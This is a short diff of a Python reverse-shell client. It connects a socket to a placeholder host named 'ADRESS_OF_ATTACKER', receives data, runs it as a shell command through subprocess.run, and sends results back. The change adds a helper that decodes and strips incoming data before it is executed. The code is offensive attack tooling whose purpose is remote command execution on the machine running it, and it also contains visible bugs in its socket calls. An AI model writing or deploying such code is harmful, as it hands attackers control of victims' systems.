@@ -14,11 +14,14 @@ HOST = "ADRESS_OF_ATTACKER"
 
 sock_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+def shelled_stripped(data):
+    return data.decode("utf-8").strip()
+
 try:
     sock_client.connect(HOST,DEFAULT_PORT)
     data = sock_client.recv(MAX_BUFF)
-    if data.decode():
-        subprocess.run(data.decode)
+    if data:
+        subprocess.run(shelled_stripped(data))
         sock_client.send(subprocess.run)
         while True:
             sock_client.send("")
